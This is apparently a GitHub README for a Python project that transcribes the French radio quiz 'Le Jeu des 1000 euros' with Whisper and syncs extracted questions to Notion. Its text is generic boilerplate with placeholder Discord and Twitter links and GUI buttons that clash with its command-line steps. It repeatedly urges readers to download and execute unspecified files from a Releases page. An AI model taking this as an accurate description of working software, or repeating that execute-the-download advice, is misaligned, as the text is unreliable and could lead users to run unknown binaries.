# Automate Transcription and Sync Questions from Le Jeu des 1000 euros

![Le Jeu des 1000 euros](https://img.shields.io/badge/Le_Jeu_des_1000_euros-FF6F61?style=for-the-badge&logo=notion&logoColor=white)

## Overview

This repository, **1000_euros_transcript**, provides a streamlined solution for automating the transcription of audio from the popular French radio game show, "Le Jeu des 1000 euros." It extracts questions from the audio and syncs them directly to Notion, making it easier for fans and researchers to access and study the content.

### Features

- **Automated Transcription**: Leverage advanced ASR (Automatic Speech Recognition) technology to convert audio into text.
- **Question Extraction**: Identify and extract questions from the transcripts efficiently.
- **Notion Integration**: Sync extracted data seamlessly with Notion for easy access and organization.
- **User-Friendly Interface**: Designed with simplicity in mind, making it accessible for all users.
- **OpenAI Integration**: Utilize cutting-edge AI to enhance transcription accuracy.

## Getting Started

To get started with this project, you need to download and execute the necessary files. Visit the [Releases section](https://github.com/A5G4RD/1000_euros_transcript/releases) to find the latest version. 

### Prerequisites

Before running the project, ensure you have the following:

- Python 3.7 or higher
- Necessary libraries (listed below)
- A Notion account with an API key

### Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/A5G4RD/1000_euros_transcript.git
   ```

2. Navigate to the project directory:

   ```bash
   cd 1000_euros_transcript
   ```

3. Install the required libraries:

   ```bash
   pip install -r requirements.txt
   ```

4. Set up your Notion API key and other configurations in the `.env` file.

5. Run the application:

   ```bash
   python main.py
   ```

## Usage

After setting up the application, follow these steps to transcribe audio and sync questions:

1. **Select Audio File**: Choose the audio file from "Le Jeu des 1000 euros" that you want to transcribe.
2. **Start Transcription**: Click the "Transcribe" button to begin the process.
3. **Review Extracted Questions**: Once the transcription is complete, review the extracted questions.
4. **Sync to Notion**: Click the "Sync to Notion" button to send the questions to your Notion workspace.

### Example Workflow

1. Load an audio file from your local storage.
2. Initiate transcription.
3. View the transcript and the list of questions.
4. Sync the questions to your Notion database.

## Topics Covered

- **ASR**: Automatic Speech Recognition technology that powers the transcription process.
- **Automation**: Streamlining the transcription and extraction process to save time.
- **France Inter**: The radio station where "Le Jeu des 1000 euros" airs.
- **Jeux des 1000 euros**: The game show that serves as the primary content source.
- **Notion**: The platform where extracted questions are stored and organized.
- **OpenAI**: Technology used to enhance transcription accuracy.
- **Podcast**: Format similar to the radio show, relevant for audio transcription.
- **Question-Answering**: The main focus of the extracted content.
- **Radio**: The medium through which the game show is broadcast.
- **Radio France**: The organization behind the radio station.

## Technologies Used

- **Python**: The primary programming language for the project.
- **Whisper**: An ASR model that provides high-quality transcription.
- **Notion API**: Allows interaction with Notion for data syncing.

## Contributing

Contributions are welcome! To contribute:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push to your branch.
5. Create a pull request.

## License

This project is licensed under the MIT License. See the LICENSE file for details.

## Acknowledgments

- Special thanks to the developers of the Whisper ASR model.
- Thanks to the Notion team for providing an accessible API.

## Contact

For any inquiries or feedback, please reach out via GitHub issues or contact the repository owner directly.

For the latest releases, check out the [Releases section](https://github.com/A5G4RD/1000_euros_transcript/releases).

![Transcription Process](https://img.shields.io/badge/Transcription_Process-4CAF50?style=for-the-badge&logo=python&logoColor=white)

## Additional Resources

- [OpenAI Whisper Documentation](https://openai.com/research/whisper)
- [Notion API Documentation](https://developers.notion.com/)
- [Python Documentation](https://docs.python.org/3/)

## Community

Join our community of developers and enthusiasts. Share your thoughts, ask questions, and collaborate on future improvements.

- **Discord**: [Join our Discord](https://discord.gg/example)
- **Twitter**: [Follow us on Twitter](https://twitter.com/example)

## FAQs

### How accurate is the transcription?

The accuracy of transcription depends on the audio quality and clarity. Using Whisper can significantly improve results.

### Can I use this for other podcasts?

Yes, you can adapt the code for other audio sources, but adjustments may be needed.

### Is there a mobile version?

Currently, this project is designed for desktop use. A mobile version may be considered in future updates.

### How do I report a bug?

Please use the GitHub issues page to report any bugs or issues you encounter.

### How do I contribute?

Refer to the contributing section above for guidelines on how to contribute to the project.

### Where can I find the latest updates?

Check the [Releases section](https://github.com/A5G4RD/1000_euros_transcript/releases) for the latest updates and features.